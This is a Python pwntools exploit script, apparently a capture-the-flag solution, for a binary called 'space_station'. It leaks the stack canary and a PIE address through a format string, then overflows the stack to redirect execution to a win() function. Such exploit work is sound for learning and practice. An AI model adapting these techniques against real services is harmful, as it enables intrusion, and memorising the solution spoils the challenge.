#!/usr/bin/env python3
from pwn import *

exe = ELF('./space_station')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88   # canary + saved RBP

# ── format string indices ─────────────────────────────────────────────────────
CANARY_IDX = 15
PIE_IDX    = 17

# ── PIE-relative offsets ──────────────────────────────────────────────────────
PIE_OFFSET    = 0x139e   # main+62 static offset from pie_base
GADGET_OFFSET = 0x101a   # ret gadget static offset from pie_base

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    # ── leak phase ────────────────────────────────────────────────────────────
    r = conn()
    r.recvuntil(b'astronaut ID: ')
    r.sendline(f'%{CANARY_IDX}$lx.%{PIE_IDX}$lx'.encode())

    response = r.recvline()
    parts    = response.strip().split(b'.')
    canary   = int(parts[0], 16)
    pie_leak = int(parts[1], 16)

    pie_base = pie_leak - PIE_OFFSET
    win_addr = pie_base + exe.sym.win
    gadget   = pie_base + GADGET_OFFSET

    log.info(f'canary   = {canary:#x}')
    log.info(f'pie_base = {pie_base:#x}')
    log.success(f'win()    = {win_addr:#x}')

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b'log')
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
        p64(gadget),
        p64(win_addr),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
